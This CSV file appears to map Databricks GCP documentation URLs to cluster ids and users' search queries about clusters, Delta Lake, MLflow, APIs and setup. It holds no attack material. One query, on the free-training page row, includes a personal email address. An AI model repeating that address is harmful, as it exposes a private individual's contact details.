cluster,url,search_text
0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/customer-managed-vpc.html,bring your own vpc 32 ip customer managed network managed vpc customer-managed vpc customer-managed vpc vpc service control customer-managed vpc customer-managed vpc static ip vpc peering customer-managed vpc customer-managed vpc customer-managed vpc customer mana customer-managed vpc shared vpc own vpc managed vpc
3,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/firewall.html,"private service vpc service ""compute engine"" private google access google  private access nat gateway"
0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/index.html,manage gcp infrastructure network configuration vpc peering cloud log
0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/network-sizing.html,network sizing ip address calc pods per node network cidr
0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/permissions.html,"bind service accounts to a cluster. service account service account compute service account iam permissions service account cross project gcp service account service account user role service account service account cluster ""service account"" service account permission"
0,https://docs.gcp.databricks.com/administration-guide/cloud-configurations/gcp/regions.html,gcp regions specifying region
0,https://docs.gcp.databricks.com/administration-guide/clusters/policies-best-practices.html,cluster policies
0,https://docs.gcp.databricks.com/administration-guide/clusters/policies.html,org policy cluster policies cluster policy cluster policy cluster policies cluster policies cluster policies cluster policies
0,https://docs.gcp.databricks.com/administration-guide/clusters/web-terminal.html,cluster terminated by gcp_quota_exceeded delete files dbfts
0,https://docs.gcp.databricks.com/administration-guide/disaster-recovery.html,disaster reco disaster recovery disaster recovery
0,https://docs.gcp.databricks.com/administration-guide/genie.html,salesforce ticket
0,https://docs.gcp.databricks.com/administration-guide/index.html,billing api
0,https://docs.gcp.databricks.com/administration-guide/users-groups/index.html,sso api
0,https://docs.gcp.databricks.com/administration-guide/users-groups/scim/index.html,scim api scim integration workload identity identity federation
0,https://docs.gcp.databricks.com/administration-guide/users-groups/single-sign-on/index.html,single sign-on authentication failed. single sigon single sign on active directory azure single sign-on google identity single sign on single sign on okta sso
0,https://docs.gcp.databricks.com/administration-guide/users-groups/users.html,add users to a workspace manage users service principal add user service principal service principal service principal maximim number of users user entitlement admin service principal manage users service principal scim ad groups
3,https://docs.gcp.databricks.com/administration-guide/workspace/dbfs-browser.html,dbfs access disabled
0,https://docs.gcp.databricks.com/administration-guide/workspace/dbfs-ui-upload.html,managed vs unmanaged data
0,https://docs.gcp.databricks.com/administration-guide/workspace/notebooks.html,add user notebook utilit notebook features
0,https://docs.gcp.databricks.com/administration-guide/workspace/security.html,mime type sniffing prevention
0,https://docs.gcp.databricks.com/administration-guide/workspace/storage.html,purge workspaxe objects delete workspace dbfs rest api is disabled for this workspace.
1,https://docs.gcp.databricks.com/applications/genomics/tertiary-analytics/hail.html,databricks container services
6,https://docs.gcp.databricks.com/applications/genomics/tertiary-analytics/index.html,apache spark
1,https://docs.gcp.databricks.com/applications/machine-learning/automl.html,databricks automl data exploration
0,https://docs.gcp.databricks.com/applications/machine-learning/environment-setup.html,definitive guide
0,https://docs.gcp.databricks.com/applications/machine-learning/experiments-page.html,this section describes how to create a workspace experiment mlflow experiment: restexception: feature_disabled: creation of experiments outside the workspace is not enabled. artifact location experiment logs
0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/access-control.html,can manage
0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/concepts.html,online store online feature + dynamodb
5,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/feature-tables.html,share feature feature table
0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/index.html,feature store feature store feature store feature store feature store feature store feature store feature store feature store feature store feature store feature store
0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/python-api.html,feature store
0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/time-series.html,time series tables
0,https://docs.gcp.databricks.com/applications/machine-learning/feature-store/troubleshooting-and-limitations.html,modulenotfounderror: no module named 'mlflow'
0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/ddl-data.html,free training for ups
0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/index.html,upload data
0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/petastorm.html,single node training
0,https://docs.gcp.databricks.com/applications/machine-learning/load-data/tfrecords-save-load.html,save file
0,https://docs.gcp.databricks.com/applications/machine-learning/model-inference/index.html,serving to
0,https://docs.gcp.databricks.com/applications/machine-learning/models.html,model lifecycle mlflow model share models model monitoring
0,https://docs.gcp.databricks.com/applications/machine-learning/track-model-development/index.html,track model development
6,https://docs.gcp.databricks.com/applications/machine-learning/train-model/dl-best-practices.html,spark node size gpu deep learning samples
0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/index.html,timed train
0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/keras-tutorial.html,tensorflow and keras
0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/machine-learning.html,the big book of machine learning use cases
0,https://docs.gcp.databricks.com/applications/machine-learning/train-model/xgboost.html,basemargincol xgboost
0,https://docs.gcp.databricks.com/applications/mlflow/model-registry-example.html,mlflow model model regis
0,https://docs.gcp.databricks.com/applications/mlflow/model-registry-webhooks.html,mlflow webhooks
0,https://docs.gcp.databricks.com/applications/mlflow/model-registry.html,mlflow model registry model registry model registry mlflow model registry staging options
0,https://docs.gcp.databricks.com/applications/mlflow/model-serving.html,cluster status pending model event start model serving with api enable mlflow serving model serving model serving
0,https://docs.gcp.databricks.com/applications/mlflow/models.html,save models mlflow pyfunc log_model code_path
0,https://docs.gcp.databricks.com/applications/mlflow/projects.html,mlflow project mlflow cli
0,https://docs.gcp.databricks.com/applications/mlflow/quick-start-python.html,list python package python udf
0,https://docs.gcp.databricks.com/applications/mlflow/quick-start-r.html,r synta r notebook
0,https://docs.gcp.databricks.com/applications/mlflow/tracking-ex-pyspark.html,pyspark pmml
0,https://docs.gcp.databricks.com/applications/mlflow/tracking-ex-pytorch.html,python package
0,https://docs.gcp.databricks.com/applications/mlflow/tracking.html,track machine learning training runs
0,https://docs.gcp.databricks.com/clusters/cluster-config-best-practices.html,clusters best shuffle autoscaling cost controls spot instance storage autoscaling cluster sizing spot instances
6,https://docs.gcp.databricks.com/clusters/configure.html,cluster log cluster log aggressive scaling down preemptible vm instances cluster settings spark node size reliable cluster configurations cluster configuration page standard cluster service account
0,https://docs.gcp.databricks.com/clusters/create.html,create cluster create cluster create cluster create cluster create cluster
0,https://docs.gcp.databricks.com/clusters/gpu.html,gpu instances worker type gpu cluster gpu instances
0,https://docs.gcp.databricks.com/clusters/index.html,cluster log delivery gke cluster cluster template job cluster cluster pol cluster log delivery cluster configure cluster timeout
0,https://docs.gcp.databricks.com/clusters/init-scripts.html,init script global init script init scripts environment variables exclude runtime script script exit status is non-zero init script cluster logs
0,https://docs.gcp.databricks.com/clusters/instance-pools/configure.html,instance type family cores quota instance types idle instance auto termination
0,https://docs.gcp.databricks.com/clusters/instance-pools/edit.html,edit compute pool
0,https://docs.gcp.databricks.com/clusters/instance-pools/index.html,instance pool
0,https://docs.gcp.databricks.com/clusters/preemption.html,fair scheduling
0,https://docs.gcp.databricks.com/clusters/single-node.html,cluster settings
2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-concepts.html,data live tables delta live tables delta live tables delta live delta live tables delta live tables delta live tables live table materialized views
2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-cookbook.html,delta live tables import dlt
0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-event-log.html,event log event log
0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-incremental-data.html,monitor stream building incrementally processed etl pipelines streaming google pub/sub streaming in pro stream failure
0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-publish.html,create database
0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-python-ref.html,great expectation python library dlt apply
2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-quickstart.html,delta live
2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-sql-ref.html,delta live tables drop
0,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/delta-live-tables-ui.html,create database
2,https://docs.gcp.databricks.com/data-engineering/delta-live-tables/index.html,delta live live table delta live tables delta live tables delta live table live tables delta live table delta live tables delta live tables delta live tables delta live tables delta live tables live tables delta live table live t delta live delta live great expectations delta live tables delta live
0,https://docs.gcp.databricks.com/data-engineering/index.html,data processing
0,https://docs.gcp.databricks.com/data-engineering/jobs/index.html,workflows with jobs workflows with jobs workflows with jobs multi task
6,https://docs.gcp.databricks.com/data-engineering/jobs/jobs-quickstart.html,"com.google.cloud.spark.bigquery.repackaged.com.google.inject.provision exception: unable to provision, see the following errors: details for job com.google.cloud.spark.bigquery.repackaged.com.google.inject.provision exception: unable to provision, see the following errors: create job create a job delta live tables"
6,https://docs.gcp.databricks.com/data-engineering/jobs/jobs.html,legacy spark-submit task retries multi task
0,https://docs.gcp.databricks.com/data/data-sources/aws/amazon-redshift.html,redshift jdbc driver
0,https://docs.gcp.databricks.com/data/data-sources/aws/amazon-s3-select.html,s3 dbfs hadoop configuration
3,https://docs.gcp.databricks.com/data/data-sources/aws/amazon-s3.html,s3 dbfs s3 access dlt aws s3 lifecycle s3
0,https://docs.gcp.databricks.com/data/data-sources/azure/azure-storage.html,storage account name
6,https://docs.gcp.databricks.com/data/data-sources/azure/cosmosdb-connector.html,facing issue while writing data to cosmos through spark
2,https://docs.gcp.databricks.com/data/data-sources/google/bigquery.html,enable views bigquery bind service accounts to a cluster. write to bigquery load csv to bigquery service account azure bigquery integration google big query querying delta. from. bigquery google sheets
0,https://docs.gcp.databricks.com/data/data-sources/google/gcs.html,google cloud services cloud storage service account mount bucket google cloud storage service account cloud storage service account cloud storage service account google cloud storage blob storage gcs cloud storage service account google cloud storage cloud storage service account google cloud storage cloud storage service account gcs bucket cloud storage service keys service account cloud log google cloud storage autoscaling ssd storage
0,https://docs.gcp.databricks.com/data/data-sources/hive-tables.html,python read database tables
0,https://docs.gcp.databricks.com/data/data-sources/image.html,working on image files
2,https://docs.gcp.databricks.com/data/data-sources/index.html,data source data sour failed to find data source: tahoe. apache spark connection as data source create delta table
0,https://docs.gcp.databricks.com/data/data-sources/mlflow-experiment.html,experiments api create workspace experiment
0,https://docs.gcp.databricks.com/data/data-sources/read-csv.html,binary file export file copy output to local csv file
6,https://docs.gcp.databricks.com/data/data-sources/read-parquet.html,parquet table copy file parquet file how to read gcs file how to read gcs file create parquet spark write parquet file to folder read parquet file
0,https://docs.gcp.databricks.com/data/data-sources/snowflake.html,load data from snowflake
4,https://docs.gcp.databricks.com/data/data-sources/sql-databases.html,spark sql etl jdbc connecting to sql databases using jdbc jdbc connect connec† sql sql endpoint connection details simba jdbc
0,https://docs.gcp.databricks.com/data/data-sources/xml.html,parsing xml xml parsing
1,https://docs.gcp.databricks.com/data/databricks-file-system.html,file system configure dbfs custom dbfs mount point databricks file system (dbfs) dbfs move file dbfs rest api is disabled for this workspace object storage dbfs rest api is disabled dbfs api dbutils cp databricks file system (dbfs) upload file dbfs rest api is disabled for this workspace. dbfs utils databricks file system dbfs gcs uploading files mount mnt local disk encryption dbfs rest api is disabled for this workspace dbfs mounts dbfs api
0,https://docs.gcp.databricks.com/data/filestore.html,temp folder
0,https://docs.gcp.databricks.com/data/metastores/external-hive-metastore.html,vpc peering external apache hive metastore external metastore metastore separate vpc hive metastore hive metastore external hive external apache hive metastore
0,https://docs.gcp.databricks.com/data/metastores/index.html,hive metastore default metastore location data proc metastore
2,https://docs.gcp.databricks.com/delta/best-practices.html,delta lake start
0,https://docs.gcp.databricks.com/delta/concurrency-control.html,optimistic concurrency
0,https://docs.gcp.databricks.com/delta/data-transformation/complex-types.html,data type copy into
0,https://docs.gcp.databricks.com/delta/data-transformation/index.html,data type
2,https://docs.gcp.databricks.com/delta/delta-apidoc.html,delta lake
2,https://docs.gcp.databricks.com/delta/delta-batch.html,mode overwrite create delta table
2,https://docs.gcp.databricks.com/delta/delta-change-data-feed.html,change set readstream delta
2,https://docs.gcp.databricks.com/delta/delta-ingest.html,copy into ingest data copy into ingest incremental migrating transactional data to a delta lake using aws dms: schema evolution delta lake start copy parquet
2,https://docs.gcp.databricks.com/delta/delta-intro.html,load data into delta tables time travel
0,https://docs.gcp.databricks.com/delta/delta-streaming.html,building batch-processed etl pipelines input rate
5,https://docs.gcp.databricks.com/delta/delta-update.html,delete table schema evolution
2,https://docs.gcp.databricks.com/delta/index.html,delta lake delta lake guide
2,https://docs.gcp.databricks.com/delta/integrations.html,delta table external data access databricks athena manifest external data
5,https://docs.gcp.databricks.com/delta/intro-notebooks.html,load table result
0,https://docs.gcp.databricks.com/delta/join-performance/skew-join.html,adaptive skew
2,https://docs.gcp.databricks.com/delta/optimizations/auto-optimize.html,delta auto op
2,https://docs.gcp.databricks.com/delta/optimizations/delta-cache.html,delta cache delta caching
0,https://docs.gcp.databricks.com/delta/optimizations/dynamic-file-pruning.html,dynamic views
0,https://docs.gcp.databricks.com/delta/optimizations/index.html,data skipping indexes
0,https://docs.gcp.databricks.com/delta/optimizations/optimization-examples.html,copy into
0,https://docs.gcp.databricks.com/delta/porting.html,workspace migration
5,https://docs.gcp.databricks.com/delta/versioning.html,show table versions
0,https://docs.gcp.databricks.com/dev-tools/api/1.2/index.html,dlt job status
0,https://docs.gcp.databricks.com/dev-tools/api/2.0/jobs.html,job api jobs api
0,https://docs.gcp.databricks.com/dev-tools/api/2.1/index.html,rest api rest api rest ao
1,https://docs.gcp.databricks.com/dev-tools/api/index.html,rest api rest api account api enable api rest api rest api cluster json rest api databricks api rest api rest api rest api rest api
3,https://docs.gcp.databricks.com/dev-tools/api/latest/authentication.html,personal access token personal access tokens access token gcp credits api token
0,https://docs.gcp.databricks.com/dev-tools/api/latest/clusters.html,enable api cluster api api cl cluster terminated by gcp_quota_exceeded cluster api clusters api api refernce cluster api
0,https://docs.gcp.databricks.com/dev-tools/api/latest/examples.html,account api dbfs api import dbc create workspace dbfs api dbfs api account api account api
0,https://docs.gcp.databricks.com/dev-tools/api/latest/global-init-scripts.html,init script grobal init script init script init script
0,https://docs.gcp.databricks.com/dev-tools/api/latest/groups.html,api 2.0
0,https://docs.gcp.databricks.com/dev-tools/api/latest/instance-pools.html,autoscaling local storage
3,https://docs.gcp.databricks.com/dev-tools/api/latest/ip-access-list.html,ip access lists ip access list ip access list
0,https://docs.gcp.databricks.com/dev-tools/api/latest/jobs.html,jobs api jobs api jobs api
0,https://docs.gcp.databricks.com/dev-tools/api/latest/libraries.html,list package whl file install
0,https://docs.gcp.databricks.com/dev-tools/api/latest/policies.html,cluster policies cluster policy attribute paths
0,https://docs.gcp.databricks.com/dev-tools/api/latest/scim/index.html,scim api
0,https://docs.gcp.databricks.com/dev-tools/api/latest/scim/scim-users.html,deactivate user scim integration user entitlement deactivate user scim oidc
0,https://docs.gcp.databricks.com/dev-tools/api/latest/secrets.html,"key management initial_manage_principal \""users\"""
0,https://docs.gcp.databricks.com/dev-tools/api/latest/tokens.html,api token
0,https://docs.gcp.databricks.com/dev-tools/api/latest/workspace.html,workspace api workspace api workspace api gcp api import dbc create workspace
0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/databricks.feature_store.entities.feature_lookup.html,feature lookup
0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.amazon_rds_mysql_online_store_spec.html,error 'failed to store the result. try rerunning the command'
0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.azure_mysql_online_store_spec.html,fs.azure.account.auth.type sharedkey
4,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.azure_sql_server_online_store_spec.html,find server name sql server the instance of the sql server database engine cannot obtain a lock resource at this time
0,https://docs.gcp.databricks.com/dev-tools/api/python/latest/feature-store/online_store_spec/databricks.feature_store.online_store_spec.online_store_spec.html,online feature store online store
0,https://docs.gcp.databricks.com/dev-tools/ci-cd/ci-cd-github.html,jobs runs
0,https://docs.gcp.databricks.com/dev-tools/ci-cd/ci-cd-jenkins.html,automation testing with gcp
6,https://docs.gcp.databricks.com/dev-tools/cli/clusters-cli.html,cluster id spark versions list clusters cli
0,https://docs.gcp.databricks.com/dev-tools/cli/dbfs-cli.html,dbfs api cli profile fs move files directories to cli
1,https://docs.gcp.databricks.com/dev-tools/cli/index.html,databricks cli auth databricks cli databricks cli databricks cli databricks cli databricks cli databricks cli databricks cli
0,https://docs.gcp.databricks.com/dev-tools/cli/libraries-cli.html,google cloud jar file
6,https://docs.gcp.databricks.com/dev-tools/cli/runs-cli.html,legacy spark-submit
0,https://docs.gcp.databricks.com/dev-tools/cli/secrets-cli.html,create secret scope dbutils secret initial manage user scopes
1,https://docs.gcp.databricks.com/dev-tools/cli/tokens-cli.html,databricks oauth token
1,https://docs.gcp.databricks.com/dev-tools/cli/workspace-cli.html,databricks workspace
1,https://docs.gcp.databricks.com/dev-tools/databricks-connect.html,"databricks connect databricks connect java version koalas pyspark databricks connect a connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond koalas pyspark db connect databricks connect adding libraries using databricks connect"
0,https://docs.gcp.databricks.com/dev-tools/databricks-utils.html,"tag dbutils dbutils.secrets.get(scope = 'es312u', key = 'deep') dbutils getcontext dbutils secrets dbutils get secrets db utils"
0,https://docs.gcp.databricks.com/dev-tools/datagrip.html,create token how do
0,https://docs.gcp.databricks.com/dev-tools/index.html,patterns and practices cluster job
0,https://docs.gcp.databricks.com/dev-tools/pyodbc.html,"import pyodbc a connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond koalas pyspark"
4,https://docs.gcp.databricks.com/dev-tools/python-sql-connector.html,databricks sql databricks sql databricks sql databricks sql databricks sql databricks sql
0,https://docs.gcp.databricks.com/dev-tools/terraform/index.html,create a job using terraform workspace terraform
2,https://docs.gcp.databricks.com/error-messages/index.html,"the error typically occurs when the default log store implementation, that is, featurestore, is used to write into a delta table on a non-hdfs storage system. in order to get the transactional acid aug"
0,https://docs.gcp.databricks.com/getting-started/admin-get-started.html,failed to get oatuh
0,https://docs.gcp.databricks.com/getting-started/community-edition.html,free trial community edition
0,https://docs.gcp.databricks.com/getting-started/concepts.html,workload insights column
0,https://docs.gcp.databricks.com/getting-started/connect/index.html,etl firewall
0,https://docs.gcp.databricks.com/getting-started/delta.html,bronze silver
1,https://docs.gcp.databricks.com/getting-started/free-training.html,self paced free free training for ups get free databricks training reset password for my burkomo@gmail.com  account
0,https://docs.gcp.databricks.com/getting-started/index.html,free trial getting started
0,https://docs.gcp.databricks.com/getting-started/introduction/index.html,gcp architecture
0,https://docs.gcp.databricks.com/getting-started/overview.html,external data source gcp architecture control plane
0,https://docs.gcp.databricks.com/getting-started/spark/dataframes.html,pyspark dataframe from gcp bucket
6,https://docs.gcp.databricks.com/getting-started/spark/datasets.html,spark datasets
6,https://docs.gcp.databricks.com/getting-started/spark/index.html,apache spark
6,https://docs.gcp.databricks.com/getting-started/spark/quick-start.html,spark context start cluster cluster is not getting started
0,https://docs.gcp.databricks.com/getting-started/try-databricks-gcp.html,cancel free trail on google cloud platform free trial gcp quota exceed failed to get oauth gcp quota free trial
0,https://docs.gcp.databricks.com/getting-started/tutorials/index.html,best practices best prac
0,https://docs.gcp.databricks.com/index.html,no active google kubernetes engine cluster found for workspace
5,https://docs.gcp.databricks.com/ingestion/add-data/index.html,create table upload zip file unity catalog is in public preview. create table
0,https://docs.gcp.databricks.com/ingestion/auto-loader/csv.html,load csv into data frame
1,https://docs.gcp.databricks.com/ingestion/auto-loader/index.html,auto loader databricks autoloader
2,https://docs.gcp.databricks.com/ingestion/copy-into/index.html,load data into delta tables
0,https://docs.gcp.databricks.com/ingestion/index.html,data ingest
0,https://docs.gcp.databricks.com/integrations/bi/jdbc-odbc-bi.html,odbc driver m1 ssl jdbc jdbc guide jdbc connecy
0,https://docs.gcp.databricks.com/integrations/bi/looker.html,dimension tables
0,https://docs.gcp.databricks.com/integrations/bi/mode.html,mode overwrite
2,https://docs.gcp.databricks.com/integrations/bi/power-bi.html,power bi delta sharing odbc: error [hy000]
0,https://docs.gcp.databricks.com/integrations/index.html,integration service business intelligence
1,https://docs.gcp.databricks.com/integrations/partners.html,connect partners databricks partner connect partner connect partner connect
0,https://docs.gcp.databricks.com/lakehouse/index.html,lakehouse fundamental
0,https://docs.gcp.databricks.com/languages/koalas.html,koalas pyspark
0,https://docs.gcp.databricks.com/languages/pandas-spark.html,pandas api
0,https://docs.gcp.databricks.com/languages/python.html,self paced free import notebook pyspark api koalas pyspark
0,https://docs.gcp.databricks.com/libraries/cluster-libraries.html,installing libr
1,https://docs.gcp.databricks.com/libraries/index.html,runtime libraries fail to install python library glpk adding libraries using databricks connect install ubuntu libraries
6,https://docs.gcp.databricks.com/libraries/notebooks-python-libraries.html,notebook scoped libraries install notebook spark env fail to install python library glpk notebook scoped library databricks install python modules in notebook
0,https://docs.gcp.databricks.com/libraries/workspace-libraries.html,workspace libraries install jar file using python for google cloud list package python wheel create folder under filestore
0,https://docs.gcp.databricks.com/migration/production.html,ganglia metrics ganglia metrics
0,https://docs.gcp.databricks.com/migration/single-node.html,single node training
0,https://docs.gcp.databricks.com/notebooks/github-version-control.html,github repo
0,https://docs.gcp.databricks.com/notebooks/index.html,share notebook schedule a notebook notebook parameter share notebook testing notebooks notebook results storage
4,https://docs.gcp.databricks.com/notebooks/notebook-workflows.html,db sql
0,https://docs.gcp.databricks.com/notebooks/notebooks-manage.html,maximum execution context manage notebooks create notebook maximum execution context notebook parameter import dbc
0,https://docs.gcp.databricks.com/notebooks/package-cells.html,list python package
0,https://docs.gcp.databricks.com/notebooks/visualizations/html-d3-and-svg.html,import notebook
0,https://docs.gcp.databricks.com/notebooks/visualizations/index.html,data profiles auto plot adjustment
0,https://docs.gcp.databricks.com/notebooks/widgets.html,widget runtime
0,https://docs.gcp.databricks.com/py-modindex.html,python module index dlt python module python module
1,https://docs.gcp.databricks.com/reference/command.html,tag dbutils object storage databricks cli
0,https://docs.gcp.databricks.com/reference/mlflow-api.html,api services mlflow api
4,https://docs.gcp.databricks.com/release-notes/gcp-features.html,"container services credential passthrough google kubernetes engine accounts api feature parity billable usage delivery to gcs bucket active directory account api google cloud customer managed vpc cloud composer account api unexpected state for cluster - failure customize containers with databricks container services accounts api customer managed keys openid connect account api billable usage delivery to gcs bucket workload identity feature parity ""service account"" sql endpoint on google cloud cluster launch timeout. no active google kubernetes engine cluster found for workspace. retrying google kubernetes engine cluster creation. active directory"
0,https://docs.gcp.databricks.com/release-notes/index.html,release notes release notes
0,https://docs.gcp.databricks.com/release-notes/product/2021/april.html,python library
0,https://docs.gcp.databricks.com/release-notes/product/2021/february.html,power bi google cloud storage
0,https://docs.gcp.databricks.com/release-notes/product/2021/july.html,secure cluster
0,https://docs.gcp.databricks.com/release-notes/product/2021/march.html,gke version
0,https://docs.gcp.databricks.com/release-notes/product/2021/november.html,preemptible vm instances
0,https://docs.gcp.databricks.com/release-notes/product/2021/september.html,unity catalog is in public preview.
5,https://docs.gcp.databricks.com/release-notes/product/2022/april.html,live table tags release notes job alert
0,https://docs.gcp.databricks.com/release-notes/product/2022/may.html,driver proxy
0,https://docs.gcp.databricks.com/release-notes/product/index.html,public ips
1,https://docs.gcp.databricks.com/release-notes/runtime/10.2ml.html,databricks runtime 10.2 ml
1,https://docs.gcp.databricks.com/release-notes/runtime/11.0.html,databricks connect beta
0,https://docs.gcp.databricks.com/release-notes/runtime/7.4.html,aws attributes
0,https://docs.gcp.databricks.com/release-notes/runtime/8.0.html,credential passthrough credential passthrough
1,https://docs.gcp.databricks.com/release-notes/runtime/8.2.html,databricks runtime
0,https://docs.gcp.databricks.com/release-notes/runtime/9.0ml.html,google client library
0,https://docs.gcp.databricks.com/release-notes/runtime/9.1.html,9.1 lts conda on 9.1 lts runtime 9.1 lts 9.1 lts 9.1 lts 9.1 lts
0,https://docs.gcp.databricks.com/release-notes/runtime/9.1ml.html,9.1 lts ml pytorch lightning
0,https://docs.gcp.databricks.com/release-notes/runtime/databricks-runtime-ver.html,end of life supported dbr supported releases java runtime support
0,https://docs.gcp.databricks.com/release-notes/runtime/maintenance-updates.html,credential passthrough
0,https://docs.gcp.databricks.com/release-notes/runtime/releases.html,runtime 10
0,https://docs.gcp.databricks.com/repos/gitlab-version-control.html,control version
1,https://docs.gcp.databricks.com/repos/index.html,"error on git pull after enabling ""‘files in repos’ feature"" where to find  repos icon files in repos arbitrary files in repos create repos in databricks"
0,https://docs.gcp.databricks.com/repos/set-up-git-integration.html,azure devops configure git repository
0,https://docs.gcp.databricks.com/resources/limits.html,workspace limits standard premium copy into limit
0,https://docs.gcp.databricks.com/resources/status.html,manage subscription
1,https://docs.gcp.databricks.com/resources/support.html,open a support ticket business critical support databricks support ticket # 00147690 support coverage
